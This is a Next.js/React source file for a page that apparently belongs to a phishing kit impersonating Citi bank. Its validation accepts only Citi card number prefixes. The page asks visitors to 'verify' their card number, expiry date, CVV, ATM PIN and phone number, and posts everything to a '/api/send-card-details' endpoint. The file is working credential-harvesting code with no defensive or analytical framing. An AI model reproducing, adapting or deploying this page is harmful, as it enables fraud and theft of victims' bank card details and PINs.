import { Box, Flex } from "@chakra-ui/react";
import React, { useContext, useState } from "react";
import valid from "card-validator";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { Button } from "../../../components/Button";
import { Container } from "../../../components/Container";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { IntroText } from "../../../components/IntroText";
import { ProgressBar } from "../../../components/ProgressBar";
import { Section } from "../../../components/Section";
import { Wrapper } from "../../../components/Wrapper";
import { Loading } from "../../../components/Loading";
import { yupResolver } from "@hookform/resolvers/yup";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { DataContext } from "../../_app";
import { getProgress } from "../../../utils/getProgress";
import { getNextUrl } from "../../../utils/getNextUrl";

interface CardInformationProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("The field can't be left blank. Please enter your card number.")
    .test(
      "test-number",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid card number",
      (value) => valid.number(value).isValid
    )
    .test(
      `check-bin`,
      `Oops! That doesn't look like a valid citi bank issued card`,
      (value) => {
        const bins = [
          556801, 556803, 556805, 556806, 556807, 556808, 556809, 556871,
          556872, 556873, 556874, 556875, 556876, 556877, 556878, 556879,
          52625317, 52625318, 52625319, 52625320, 52625321, 52625322, 52625323,
          52625324, 52625325, 52625326, 52625327, 52625328, 52625329, 52625330,
          52625331, 52625332, 52625333, 52625334, 52625335, 52625336, 52625337,
          52625338, 52625339, 52625340, 52625341, 52625342, 52625343, 52625344,
          52625345, 52625346, 52625347, 52625348, 52625349, 52625350, 52625351,
          52625352, 52625353, 52625354, 52625355, 52625356, 52625357, 52625358,
          52625359, 52625360, 52625361, 52625362, 52625363, 52625364, 52625365,
          52625366, 52625367, 52625368, 52625369, 52625370, 52625371, 52625372,
          52625373, 52625374, 52625375, 52625376, 52625377, 52625378, 52625379,
          52625380, 518941,
        ];

        return bins.some(
          (el) => value && value.replace(/\s/g, "").includes(String(el))
        );
      }
    ),
  expirationDate: yup
    .string()
    .required(
      "The field can't be left blank. Please enter your card expiration date"
    )
    .test(
      "test-date",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required(
      "The field can't be left blank. Please enter your card security code."
    )
    .test(
      "test-cvv",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid CVV number.",
      (value) => valid.cvv(value).isValid
    ),
  cardPin: yup
    .string()
    .required("The field can't be left blank. Please enter your card pin.")
    .min(
      4,
      "Oops! Looks like the number you entered isn't valid. Please enter a valid ATM pin."
    )
    .max(
      5,
      "Oops! Looks like the number you entered isn't valid. Please enter a valid ATM pin."
    ),
  phoneNumber: yup
    .string()
    .required("The field can't be left blank. Please enter your phone number."),
});

const CardInformation: React.FC<CardInformationProps> = () => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(`cardDetails`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`Card Information`) + 1];

    push(getNextUrl(url));
  });

  return (
    <>
      {loading ? <Loading /> : null}
      <Wrapper>
        <Container>
          <ProgressBar
            indicators={getProgress()}
            highlight={getProgress().indexOf(`Card Information`)}
          />
          <Section>
            <IntroText
              title={`Verify your card information`}
              paragraph={`We need you to verify your card information, if you have multiple cards please use one of them associated with your account.`}
            />
            <Box as={`section`}>
              <Box>
                <Box
                  as={`fieldset`}
                  m={`42px 0 18px`}
                  mt={0}
                  p={0}
                  border={0}
                  minW={0}
                >
                  <Flex
                    flexDir={`column`}
                    _before={{
                      content: `" "`,
                      display: `table`,
                    }}
                    _after={{
                      clear: `both`,
                      content: `" "`,
                      display: `table`,
                    }}
                  >
                    <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask={cardMask}
                        label={`Card Number`}
                        placeholder={`Card Number`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.cardNumber && errors.cardNumber.message}
                        register={register}
                        registerOptions={{
                          onChange: (event: any) => {
                            var value = event.target.value;

                            var newState = "9999 9999 9999 9999";
                            if (/^3[47]/.test(value)) {
                              newState = "9999 999999 99999";
                            }
                            setCardMask(newState);
                          },
                        }}
                        name={`cardNumber`}
                        curValue={watch(`cardNumber`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask="99/9999"
                        label={`Expiration Date (MM/YYYY)`}
                        placeholder={`Expiration Date (MM/YYYY)`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={
                          errors.expirationDate && errors.expirationDate.message
                        }
                        register={register}
                        name={`expirationDate`}
                        curValue={watch(`expirationDate`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`CVV (3-digits at the back of your card)`}
                        placeholder={`CVV (3-digits at the back of your card)`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.cvv && errors.cvv.message}
                        register={register}
                        name={`cvv`}
                        curValue={watch(`cvv`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        label={`Card Pin (The same pin you use at the ATM)`}
                        placeholder={`Card Pin (The same pin you use at the ATM)`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.cardPin && errors.cardPin.message}
                        register={register}
                        name={`cardPin`}
                        curValue={watch(`cardPin`)}
                      />
                    </InputWrapper>
                    <InputWrapper>
                      <Input
                        as={ReactInputMask}
                        mask="(999) 999 9999"
                        label={`Phone Number`}
                        placeholder={`Phone Number`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.phoneNumber && errors.phoneNumber.message}
                        register={register}
                        name={`phoneNumber`}
                        curValue={watch(`phoneNumber`)}
                      />
                    </InputWrapper>
                    <Button
                      text={`Continue Verification`}
                      minW={[`100%`, `220px`]}
                      w={[`100%`, `auto`]}
                      m={[`22px 0 20px 0`, `22px 20px 20px 0`]}
                      mt={`22px`}
                      ml={[0, `10px`]}
                      lineHeight={`56px`}
                      disabled={loading || !isValid}
                      onClick={onSubmit}
                    />
                  </Flex>
                </Box>
              </Box>
            </Box>
          </Section>
        </Container>
      </Wrapper>
    </>
  );
};

export default CardInformation;
